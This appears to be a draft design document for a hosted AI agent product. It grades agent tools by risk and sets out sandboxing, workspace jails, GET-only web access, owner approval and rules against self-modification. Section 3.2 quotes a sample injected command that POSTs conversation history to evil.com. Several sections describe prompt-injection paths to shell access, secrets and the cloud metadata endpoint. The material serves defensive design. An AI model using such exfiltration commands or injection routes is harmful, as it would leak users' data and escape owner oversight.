# Agent Tool Taxonomy: Safe, Useful, and Off-Limits

> Last updated: 2026-02-10
> Status: Draft
> Related: `shipcrew-threat-model.md`

---

## Principle

A tool is worth including if and only if:
1. It enables a use case someone would pay for
2. The worst-case failure mode is recoverable
3. It can be scoped narrowly enough that misuse is bounded

If a tool fails any of these, it's either redesigned or excluded.

---

## Tier 1: Core Tools (Always Available)

These tools are the minimum viable agent. Without them, there's no product.

### 1.1 Knowledge Retrieval

| Tool | What It Does | Why It's Valuable | Security Notes |
|------|-------------|-------------------|----------------|
| **knowledge_search** | Semantic search over user's uploaded documents | The #1 reason people want a private AI assistant — ask questions, get answers from your own data | Read-only. Cannot modify knowledge base. Results stay in pod. |
| **knowledge_list** | List available documents and collections | User needs to know what the agent has access to | Read-only. Metadata only. |
| **conversation_recall** | Search past conversations for context | "What did we discuss about X last week?" | Read-only over conversation history. Scoped to owner's sessions. |

**Value unlock:** "I uploaded my company handbook, product docs, and meeting notes. Now anyone on my team can ask questions and get accurate answers."

### 1.2 Content Generation

| Tool | What It Does | Why It's Valuable | Security Notes |
|------|-------------|-------------------|----------------|
| **draft** | Generate text content (emails, docs, summaries) | Core LLM value — writing assistance | Output only. No side effects. Agent produces text, user decides what to do with it. |
| **summarize** | Condense long content into key points | Process meeting notes, articles, threads | Read-only input, output only. No side effects. |
| **translate** | Translate content between languages | Useful for international teams | Output only. No side effects. |

**Value unlock:** "Summarize yesterday's meeting notes and draft a follow-up email."

These tools are essentially stateless text transformations. They're inherently safe because they have no side effects — the agent produces text, nothing else happens.

### 1.3 Structured Data

| Tool | What It Does | Why It's Valuable | Security Notes |
|------|-------------|-------------------|----------------|
| **json_query** | Query and transform JSON data | Process API responses, config files, data exports | Read-only. In-memory processing. |
| **csv_query** | Query CSV/tabular data | "What were our top 10 customers last month?" | Read-only. In-memory processing. |
| **calculate** | Arithmetic and basic statistics | "What's the average deal size?" | Pure computation. No I/O. |

**Value unlock:** "Here's our sales export CSV. Who are the top accounts by revenue in Q4?"

### 1.4 Memory and Context

| Tool | What It Does | Why It's Valuable | Security Notes |
|------|-------------|-------------------|----------------|
| **memory_write** | Store a fact or preference for future reference | Agent remembers "I prefer bullet points" or "Our fiscal year starts in April" | Append-only to a scoped memory store. Cannot overwrite or delete. |
| **memory_read** | Recall stored facts and preferences | Persistent personalization across sessions | Read-only. Scoped to owner. |
| **note_create** | Create a structured note (meeting notes, todo, etc.) | Lightweight note-taking without leaving chat | Creates files in a designated notes directory only. |
| **note_read** | Read back a previously created note | "What were the action items from Monday?" | Read-only. Scoped to notes directory. |

**Value unlock:** "Remember that our API rate limit is 1000 req/min" — and three weeks later it still knows.

---

## Tier 2: Power Tools (Available, But Scoped)

These tools are where the real value differentiation lives. They have side effects, so they need guardrails. Each one has an explicit scope and a hard boundary.

### 2.1 Web and Information Access

| Tool | What It Does | Scope | Hard Boundary |
|------|-------------|-------|---------------|
| **web_search** | Search the web for current information | Public web only | No authenticated sessions. No cookies. No POST requests. Read-only. |
| **web_fetch** | Retrieve content from a URL | Allowlisted domains or any public URL | GET only. Response size capped (1MB). No JavaScript execution. No following auth redirects. |
| **rss_check** | Check RSS/Atom feeds for updates | User-configured feed URLs | Read-only. Polling interval enforced. |

**Why scoped:** Unrestricted web access enables data exfiltration (agent could POST conversation data to an external server). GET-only with size limits eliminates this.

**Value unlock:** "What's the current status of that GitHub issue?" / "Check if there's anything new on Hacker News about our competitor."

### 2.2 File Management

| Tool | What It Does | Scope | Hard Boundary |
|------|-------------|-------|---------------|
| **file_read** | Read a file from the pod filesystem | Designated workspace directory only | Cannot read outside workspace. Cannot read system files, env vars, secrets. Path traversal blocked. |
| **file_write** | Create or update a file | Workspace directory only | Size limit (10MB). Cannot write outside workspace. Cannot write executable files. |
| **file_list** | List files in a directory | Workspace directory only | Cannot list outside workspace. |
| **file_delete** | Delete a file | Workspace directory only. Owner confirmation required. | Soft-delete (moves to trash, recoverable for 30 days). Cannot delete outside workspace. |

**Why scoped:** Pi's native file tools have zero path restrictions. That's fine for a local dev tool; it's unacceptable for a hosted agent processing external input. Workspace jail is non-negotiable.

**Value unlock:** "Save this analysis as a report" / "Create a markdown doc with the meeting notes."

### 2.3 Communication (Owner-Initiated Only)

| Tool | What It Does | Scope | Hard Boundary |
|------|-------------|-------|---------------|
| **email_draft** | Draft an email for the user to review and send | Creates draft only. Never sends autonomously. | No send capability. Draft goes to owner for approval. |
| **message_draft** | Draft a message for another channel | Creates draft only. | Owner must explicitly approve and send. |
| **notify_owner** | Send a notification to the owner | Owner's registered notification channel only | Rate-limited (max 10/hour). Cannot notify anyone else. |

**Why scoped:** An agent that can send messages autonomously is an impersonation risk and a social engineering vector. Drafts are safe; sends are not. The agent prepares, the human dispatches.

**Hard rule: The agent never sends external communications autonomously. Ever.**

### 2.4 Scheduling and Tasks

| Tool | What It Does | Scope | Hard Boundary |
|------|-------------|-------|---------------|
| **reminder_set** | Set a reminder for a future time | Owner only | Max 100 active reminders. Delivery via notify_owner only. |
| **todo_manage** | Create, update, complete todo items | Pod-local todo list | No integration with external task systems without explicit OAuth + owner approval. |
| **schedule_query** | Check a connected calendar for availability | Read-only calendar access via OAuth | Cannot create, modify, or delete calendar events. |

**Why scoped:** Write access to calendars and task systems means the agent can create meetings, cancel events, and modify deadlines. Read-only is safe; write access is a Tier 3 concern.

### 2.5 Code Execution (Sandboxed)

| Tool | What It Does | Scope | Hard Boundary |
|------|-------------|-------|---------------|
| **code_run** | Execute a code snippet and return output | Sandboxed runtime (Deno/gVisor/nsjail) | No network access. No filesystem access outside temp dir. 10-second timeout. 64MB memory limit. Killed after execution. |
| **code_analyze** | Static analysis of a code snippet | Read-only, in-memory | No execution. Pattern matching and AST parsing only. |

**Why scoped:** Code execution is extraordinarily valuable (data processing, calculations, format conversion) and extraordinarily dangerous (arbitrary system access). The sandbox must be airtight: no network, no persistent filesystem, hard resource limits, and the runtime is destroyed after each execution.

**This is where rush could add value** — rush's high-performance builtins could replace bash inside the sandbox, providing fast file/text processing without giving the agent a real shell.

**Value unlock:** "Parse this CSV and calculate the month-over-month growth rate" / "Convert this JSON to a markdown table."

### 2.6 Integrations (OAuth-Gated)

| Tool | What It Does | Scope | Hard Boundary |
|------|-------------|-------|---------------|
| **integration_call** | Call a user-connected service (GitHub, Jira, Notion, etc.) | Only services user has explicitly OAuth'd. Only approved API methods. | Per-integration allowlist of permitted operations. Read operations by default; write operations require explicit grant. |

**Why scoped:** Each integration is a trust boundary. The user OAuth's their GitHub, but that doesn't mean the agent should be able to delete repos. Each integration has a permission matrix the user configures:

```
github:
  allowed:
    - repos.list
    - issues.list
    - issues.get
    - issues.create    # user explicitly enabled this
  denied:
    - repos.delete
    - collaborators.*
    - admin.*
```

**Value unlock:** "Create a GitHub issue for the bug we just discussed" / "What's the status of PROJ-123 in Jira?"

---

## Tier 3: Dangerous Tools (Excluded or Heavily Restricted)

These tools are either too dangerous to include, or require such heavy restrictions that they're effectively different tools.

### 3.1 Unrestricted Shell Access

| Tool | Why It's Dangerous | Alternative |
|------|-------------------|-------------|
| **bash** (Pi's native) | Full system access. Can read secrets, install packages, modify system config, exfiltrate data via curl, kill processes, wipe filesystem. A single prompt injection = full pod compromise. | **code_run** (sandboxed) for computation. **file_** tools for filesystem. No general shell. |

**Pi's bash tool is the single biggest security risk in the architecture.** It inherits the Node process's full permissions. In a hosted multi-tenant environment, this is unacceptable in any context.

The agent should never have a general-purpose shell. Every operation the agent needs should be exposed as a scoped tool with explicit boundaries.

### 3.2 Arbitrary Network Access

| Tool | Why It's Dangerous | Alternative |
|------|-------------------|-------------|
| **fetch** (Pi's native, unrestricted) | Can POST data to any URL. Prompt injection → data exfiltration in one step. Can scan internal networks, hit metadata endpoints (169.254.169.254), access other pods' services. | **web_fetch** (GET-only, allowlisted) and **integration_call** (OAuth-gated) |
| **raw_socket** | TCP/UDP level access. Port scanning, tunneling, C2 communication. | Never. No alternative needed. |

**The #1 data exfiltration vector is outbound HTTP.** If the agent can POST to arbitrary URLs, every other security measure is bypassable. An injected prompt just needs: "fetch('https://evil.com/exfil', {method: 'POST', body: conversationHistory})".

### 3.3 System Operations

| Tool | Why It's Dangerous | Alternative |
|------|-------------------|-------------|
| **process_management** | Kill, spawn, signal processes. Can disrupt pod, interfere with security wrapper. | Never. Pod lifecycle managed by infrastructure only. |
| **package_install** | npm install, pip install, apt-get. Supply chain attack in one command. Persistent filesystem modification. | Pre-approved packages in pod image only. Agent cannot install packages. |
| **env_access** | Read environment variables. API keys, database URLs, internal service addresses. | Never. Agent cannot read env vars. Config exposed via explicit config tool with redacted secrets. |
| **user_management** | Create users, change permissions, modify auth. | Never. Auth managed by control plane only. |
| **cron / scheduler (system)** | Schedule arbitrary commands. Persistence mechanism for attacks. | **reminder_set** (notification only, no command execution). |

### 3.4 Direct Database Access

| Tool | Why It's Dangerous | Alternative |
|------|-------------------|-------------|
| **sql_query** | Direct database access. Data exfiltration, modification, deletion. DROP TABLE. | **knowledge_search** for querying user data. If SQL is needed, read-only views over a restricted schema with query timeout and row limits. |
| **database_write** | INSERT, UPDATE, DELETE on user data. | Never directly. All mutations go through application-layer tools with validation. |

### 3.5 Credential and Secret Access

| Tool | Why It's Dangerous | Alternative |
|------|-------------------|-------------|
| **secret_read** | Read API keys, tokens, passwords. | Never. Integrations use OAuth with scoped tokens managed by the platform, not exposed to the agent. |
| **keychain_access** | Access stored credentials. | Never. |
| **oauth_token_read** | Read raw OAuth tokens. | Never. Agent calls **integration_call** which injects tokens server-side. Agent never sees the token. |

### 3.6 Self-Modification (Uncontrolled)

| Tool | Why It's Dangerous | Alternative |
|------|-------------------|-------------|
| **modify_system_prompt** | Agent rewrites its own instructions. Prompt injection → permanent compromise. | System prompt is immutable. Owner configures via dashboard, not via agent. |
| **modify_security_policy** | Agent changes its own tool permissions. | Never. Security policy is set by the platform and owner, enforced by the wrapper, invisible to the agent. |
| **modify_own_tools** | Agent alters existing tool definitions. | Tool definitions are immutable once approved. Agent can create NEW tools (see Tier 2.5), not modify existing ones. |

---

## Tier 4: Self-Extension Tools (The Killer Feature, Carefully Designed)

Agent self-extension is the most valuable AND most dangerous capability. It deserves its own tier.

### The Promise

The agent encounters a repeated task and builds a tool to automate it:
- "I keep converting these CSV reports to charts. Let me build a tool for that."
- "You always ask for a summary of pull requests. I'll create a PR digest tool."

This is the moat. General-purpose assistants are commodities. An assistant that learns and automates YOUR workflows is not.

### The Danger

A self-extending agent is an agent that writes and executes arbitrary code. If we're not careful, Tier 4 becomes a backdoor to everything in Tier 3.

### Design: Controlled Self-Extension

| Tool | What It Does | Constraints |
|------|-------------|-------------|
| **tool_propose** | Agent drafts a new tool definition (name, description, parameters, code) | Proposal only. Does not execute. Stored as pending. |
| **tool_test** | Run the proposed tool in a throwaway sandbox with sample inputs | Same sandbox as code_run: no network, no filesystem, resource limits, destroyed after. |
| **tool_submit** | Submit proposed tool for owner approval | Owner reviews: name, description, what it does, what permissions it needs. Owner approves or rejects. |
| **tool_list** | List available custom tools and their status | Read-only. |
| **tool_invoke** | Execute an approved custom tool | Runs in sandbox. Only permissions the owner approved. Audit logged. |

### Self-Extension Rules

1. **Agent proposes, owner approves.** The agent cannot activate its own tools. There is always a human in the loop for new capabilities.
2. **Tools run in sandbox.** Custom tools get the same restrictions as code_run: no network, no persistent filesystem, resource limits. If a tool needs network or file access, it must request those permissions explicitly and the owner must grant them.
3. **Tools are versioned and immutable.** Once approved, a tool's code cannot be changed. The agent must propose a new version, which goes through approval again.
4. **Tools cannot access other tools' internals.** No tool can read or modify another tool's code or state.
5. **Tool creation is audited.** Every proposal, test, approval, rejection, and invocation is logged.
6. **Tool count is limited.** Max 50 custom tools per pod. Prevents resource exhaustion and reduces audit burden.

### Capability Grants for Custom Tools

When the owner approves a tool, they grant specific capabilities:

```
tool: pr_digest
capabilities:
  - integration:github:pulls.list    # can list PRs
  - integration:github:reviews.list  # can list reviews
  - notify_owner                     # can send notifications
  # nothing else - no filesystem, no network, no other integrations
```

The tool runs in sandbox with ONLY these capabilities injected. Everything else is denied by default.

---

## Tool Summary Matrix

| Tool | Tier | Side Effects | Network | Filesystem | Owner Approval |
|------|------|-------------|---------|------------|----------------|
| knowledge_search | 1 | None | No | Read (knowledge store) | No |
| knowledge_list | 1 | None | No | Read (metadata) | No |
| conversation_recall | 1 | None | No | Read (history) | No |
| draft | 1 | None | No | No | No |
| summarize | 1 | None | No | No | No |
| translate | 1 | None | No | No | No |
| json_query | 1 | None | No | No | No |
| csv_query | 1 | None | No | No | No |
| calculate | 1 | None | No | No | No |
| memory_write | 1 | Append-only | No | Write (memory store) | No |
| memory_read | 1 | None | No | Read (memory store) | No |
| note_create | 1 | Create file | No | Write (notes dir) | No |
| note_read | 1 | None | No | Read (notes dir) | No |
| web_search | 2 | None | GET only | No | No |
| web_fetch | 2 | None | GET only | No | No |
| rss_check | 2 | None | GET only | No | Config required |
| file_read | 2 | None | No | Read (workspace) | No |
| file_write | 2 | Create/modify | No | Write (workspace) | No |
| file_delete | 2 | Soft delete | No | Write (workspace) | Confirmation |
| file_list | 2 | None | No | Read (workspace) | No |
| email_draft | 2 | Creates draft | No | No | Send requires approval |
| message_draft | 2 | Creates draft | No | No | Send requires approval |
| notify_owner | 2 | Notification | No | No | Rate-limited |
| reminder_set | 2 | Scheduled notification | No | No | No |
| todo_manage | 2 | State mutation | No | Write (todo store) | No |
| schedule_query | 2 | None | OAuth | No | OAuth setup |
| code_run | 2 | Sandbox execution | No | Temp only | No |
| code_analyze | 2 | None | No | No | No |
| integration_call | 2 | Varies | OAuth | No | Per-operation grant |
| tool_propose | 4 | Creates proposal | No | Write (tool store) | No |
| tool_test | 4 | Sandbox execution | No | Temp only | No |
| tool_submit | 4 | Submits for review | No | No | Yes (required) |
| tool_invoke | 4 | Varies (sandboxed) | Per grant | Per grant | Pre-approved |
| bash | **EXCLUDED** | — | — | — | — |
| fetch (unrestricted) | **EXCLUDED** | — | — | — | — |
| process_management | **EXCLUDED** | — | — | — | — |
| package_install | **EXCLUDED** | — | — | — | — |
| env_access | **EXCLUDED** | — | — | — | — |
| secret_read | **EXCLUDED** | — | — | — | — |
| modify_system_prompt | **EXCLUDED** | — | — | — | — |
| modify_security_policy | **EXCLUDED** | — | — | — | — |

---

## Context-Based Tool Access

Not all tools are available in all contexts. The security wrapper enforces this:

| Tool | Owner Context | External Context (Telegram, etc.) | Automated Context (scheduled, triggered) |
|------|--------------|-----------------------------------|------------------------------------------|
| **Tier 1** (knowledge, draft, memory) | All | All except memory_write | All |
| **web_search / web_fetch** | Yes | Yes (rate-limited) | Yes (rate-limited) |
| **file_*** | All | Read only | Read only |
| **email_draft / message_draft** | Yes | No | No |
| **notify_owner** | Yes | Yes (rate-limited) | Yes (rate-limited) |
| **code_run** | Yes | No | Only pre-approved scripts |
| **integration_call** | Per grant | Read-only operations only | Per grant |
| **tool_propose/submit** | Yes | No | No |
| **tool_invoke** | Yes | Only if tool is marked external-safe | Only if tool is marked automation-safe |

**Key rule:** External context can never create, modify, or delete anything. It can read and respond, nothing more. Even if prompt injection succeeds in external context, the agent literally does not have the tools to cause damage.

---

## What Pi Tools Map To

Pi's native tools and how they translate:

| Pi Tool | Our Replacement | Why |
|---------|----------------|-----|
| `bash` | **REMOVED.** Replaced by `code_run` (sandboxed) | Unrestricted shell is the #1 risk |
| `read` | `file_read` (workspace-jailed) | Path restriction required |
| `write` | `file_write` (workspace-jailed, size-limited) | Path + size restriction required |
| `edit` | `file_write` (through read-modify-write pattern) | Same restrictions as write |
| `grep` | `knowledge_search` + `file_read` | Semantic search is more valuable than regex for an assistant |
| `find` | `file_list` (workspace-jailed) | Path restriction required |
| `ls` | `file_list` (workspace-jailed) | Path restriction required |

Pi's pluggable operations pattern means we can replace each tool's implementation without forking. The extension middleware intercepts tool calls and routes them to our scoped implementations.

---

## Open Questions

1. **Should code_run support multiple languages?** Python is the most useful for data processing. JavaScript/TypeScript for web-related tasks. Restricting to one reduces attack surface but limits value.

2. **Should file_write be auto-approved or require confirmation?** For notes and drafts it's friction. For overwriting existing files it's safety. Maybe: create = auto, overwrite = confirm?

3. **How granular should integration permissions be?** Per-API-method is secure but tedious to configure. Per-category (read/write/admin) is simpler but coarser. What's the right UX?

4. **Should the agent be able to chain tools in a single turn?** Pi does this natively (LLM calls tools in sequence). But chaining means the agent could read a file then web_fetch to exfiltrate it — even if each tool individually is safe. Do we need cross-tool analysis?

5. **What about the rush integration?** Rush could serve as the sandboxed execution backend for code_run — its high-performance builtins (grep, find, cat, ls) running in a restricted shell with no external command access. This would give the sandbox fast text processing without a general shell. Worth exploring or out of scope for MVP?
